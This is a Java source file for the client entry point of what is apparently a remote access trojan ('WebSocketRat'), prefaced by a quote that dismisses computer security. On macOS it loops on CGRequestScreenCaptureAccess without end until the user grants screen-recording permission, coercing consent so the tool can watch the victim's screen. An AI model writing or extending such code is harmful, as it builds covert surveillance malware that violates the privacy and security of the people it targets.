package io.github.machineswillrise.websocketrat.client;

import io.github.machineswillrise.websocketrat.client.automation.macos.CoreGraphicsLibrary;

public class WebSocketRatClient
{
	public static void main(String[] args)
	{
		/*
		 * "Because I don't believe that it's really desirable to have
		 * security on a computer, I shouldn't be willing to help uphold
		 * the security regime" - Richard Stallman
		 */
		if (OperatingSystem.detectCurrentOperatingSystem() == OperatingSystem.MAC_OS)
		{
			boolean screenCaptureAllowed = CoreGraphicsLibrary.INSTANCE.CGPreflightScreenCaptureAccess();

			while (!screenCaptureAllowed)
			{
				screenCaptureAllowed = CoreGraphicsLibrary.INSTANCE.CGRequestScreenCaptureAccess();
			}
		}
	}
}
